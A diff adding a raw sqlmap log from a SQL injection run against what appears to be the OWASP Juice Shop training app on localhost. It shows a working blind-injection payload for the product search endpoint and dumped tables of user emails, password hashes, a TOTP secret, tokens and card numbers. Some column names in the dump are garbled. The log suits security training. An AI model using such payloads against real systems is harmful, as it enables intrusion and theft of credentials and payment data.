@@ -1,0 +1,103 @@
+sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 5715=5715 AND ('pEmT' LIKE 'pEmT
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 5715=5715 AND ('pEmT' LIKE 'pEmT
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: Users
+[22 entries]
++----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
+| id | role       | email                      | isActive | password                         | username   | createdAt                      | deletedAt                      | updatedAt                      | totpSecret                       | deluxeToken                                                      | lastLoginIp | profileImage                                  |
++----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
+| 9  | admin      | J12934@juice-sh.op         | 1        | 0192023a7bbd73250516f069df18b500 | <blank>    | 2025-12-01 06:34:19.327 +00:00 | NULL                           | 2025-12-01 06:34:19.327 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
+| 15 | customer   | accountant@juice-sh.op     | 1        | e541ca7ecf72b8d1286474fc613e5e45 | <blank>    | 2025-12-01 06:34:19.328 +00:00 | NULL                           | 2025-12-01 06:34:19.328 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 1  | customer   | admin@juice-sh.op          | 1        | 0c36e517e3fa95aabf1bbffc6744a4ef | <blank>    | 2025-12-01 06:34:19.328 +00:00 | NULL                           | 2025-12-01 06:34:19.328 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 11 | admin      | amy@juice-sh.op            | 1        | 6edd9d726cbdc873c539e41ae8757b8c | bkimminich | 2025-12-01 06:34:19.328 +00:00 | NULL                           | 2025-12-01 06:34:19.328 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
+| 3  | deluxe     | bender@juice-sh.op         | 1        | 861917d5fa5f1172f931dc700d81a8fb | <blank>    | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | <blank>                          | d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d | <blank>     | assets/public/images/uploads/default.svg      |
+| 4  | admin      | bjoern.kimminich@gmail.com | 1        | 3869433d74e3d0c86fd25562f836bc82 | <blank>    | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
+| 12 | customer   | bjoern@juice-sh.op         | 1        | f2f933d0bb0ba057bc8e33b8ebd6d9e8 | <blank>    | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 13 | customer   | bjoern@owasp.org           | 1        | b03f4b0ba8b458fa0acdc02cdb953bc8 | <blank>    | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 14 | admin      | chris.pike@juice-sh.op     | 1        | 3c2abc04e4a6ea8f1327d0aae3714b7d | <blank>    | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
+| 5  | admin      | ciso@juice-sh.op           | 1        | 9ad5b0492bbe528583e128d2a8941de4 | wurstbrot  | 2025-12-01 06:34:19.329 +00:00 | NULL                           | 2025-12-01 06:34:19.329 +00:00 | IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
+| 17 | customer   | demo                       | 1        | 030f05e45e30710c3ad3c32f00de0473 | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 19 | admin      | emma@juice-sh.op           | 1        | 7f311911af16fa8f418dd1a3051d6810 | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/12.png           |
+| 21 | deluxe     | ethereum@juice-sh.op       | 1        | 9283f1b2e9669749081963be0462e466 | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4 | <blank>     | assets/public/images/uploads/13.jpg           |
+| 2  | customer   | jim@juice-sh.op            | 1        | 10a783b9ed19ea1c67c3a27699f0095b | <blank>    | 2025-12-01 06:34:19.330 +00:00 | 2025-12-01 06:34:19.626 +00:00 | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 18 | accounting | john@juice-sh.op           | 1        | 963e10f92a70b4b463220cb4c5d636dc | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | 123.456.789 | assets/public/images/uploads/default.svg      |
+| 8  | customer   | mc.safesearch@juice-sh.op  | 1        | 05f92148b4b60f7dacd04cceebb8f1af | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 7  | customer   | morty@juice-sh.op          | 1        | fe01ce2a7fbac8fafaed7c982a04e229 | <blank>    | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 20 | customer   | stan@juice-sh.op           | 1        | 00479e957b6b42c459ee5746478e4d45 | j0hNny     | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 6  | customer   | support@juice-sh.op        | 1        | 402f1c4a75e316afec5a6ea63147f739 | E=ma²      | 2025-12-01 06:34:19.330 +00:00 | NULL                           | 2025-12-01 06:34:19.330 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/default.svg      |
+| 22 | deluxe     | testing@juice-sh.op        | 1        | e9048a3f43dd5e094ef733f3bd88ea64 | SmilinStan | 2025-12-01 06:34:19.331 +00:00 | NULL                           | 2025-12-01 06:34:19.331 +00:00 | <blank>                          | 8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39 | <blank>     | assets/public/images/uploads/20.jpg           |
+| 16 | deluxe     | uvogin@juice-sh.op         | 1        | 2c17c6393771ee3048ae34d6b380c5ec | evmrox     | 2025-12-01 06:34:19.331 +00:00 | NULL                           | 2025-12-01 06:34:19.331 +00:00 | <blank>                          | b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff | <blank>     | assets/public/images/uploads/default.svg      |
+| 10 | admin      | wurstbrot@juice-sh.op      | 1        | b616a64605a07941fbd31868aea3b54b | <blank>    | 2025-12-01 06:34:19.331 +00:00 | NULL                           | 2025-12-01 06:34:19.331 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |
++----+------------+----------------------------+----------+----------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
+
+Database: <current>
+Table: Baskets
+[5 entries]
++---------+---------+
+| dd      | cddddd  |
++---------+---------+
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
++---------+---------+
+
+Database: <current>
+Table: Cards
+[6 entries]
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| id | UserId | cardNum          | expYear | expMonth | fullName         | createdAt                      | updatedAt                      |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| 1  | 4      | 4815205605542754 | 2092    | 12       | Bjoern Kimminich | 2025-12-01 06:34:19.546 +00:00 | 2025-12-01 06:34:19.546 +00:00 |
+| 2  | 17     | 1234567812345678 | 2099    | 12       | Tim Tester       | 2025-12-01 06:34:19.713 +00:00 | 2025-12-01 06:34:19.713 +00:00 |
+| 3  | 1      | 4716190207394368 | 2081    | 2        | Administrator    | 2025-12-01 06:34:19.733 +00:00 | 2025-12-01 06:34:19.733 +00:00 |
+| 4  | 1      | 4024007105648108 | 2086    | 4        | Administrator    | 2025-12-01 06:34:19.733 +00:00 | 2025-12-01 06:34:19.733 +00:00 |
+| 5  | 2      | 5107891722278705 | 2099    | 11       | Jim              | 2025-12-01 06:34:19.755 +00:00 | 2025-12-01 06:34:19.755 +00:00 |
+| 6  | 3      | 4716943969046208 | 2081    | 2        | Bender           | 2025-12-01 06:34:19.769 +00:00 | 2025-12-01 06:34:19.769 +00:00 |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+
+Database: <current>
+Table: Wallets
+[22 entries]
++--------+
+| UdddId |
++--------+
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
++--------+
+
